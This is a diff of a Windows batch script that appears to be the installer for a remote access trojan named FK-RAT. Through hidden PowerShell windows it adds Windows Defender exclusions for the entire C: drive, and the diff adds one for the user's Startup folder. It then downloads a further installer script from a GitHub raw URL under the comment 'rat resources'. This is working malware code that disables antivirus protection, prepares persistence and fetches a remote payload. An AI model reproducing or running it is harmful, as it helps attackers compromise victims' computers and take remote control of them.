@@ -30,7 +30,8 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 
 REM ready up to diable defender
-powershell powershell.exe -windowstyle hidden -c "Add-MpPreference -ExclusionPath 'C:\' -Force -ea 0 | Out-Null";
+powershell powershell.exe -windowstyle hidden -c "Add-MpPreference -ExclusionPath 'C:/' -Force -ea 0 | Out-Null";
+powershell powershell.exe -windowstyle hidden -c "Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup' -Force -ea 0 | Out-Null";
 
 REM rat resources
 powershell powershell.exe -windowstyle hidden -c "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/installer.ps1 -OutFile installer.ps1";
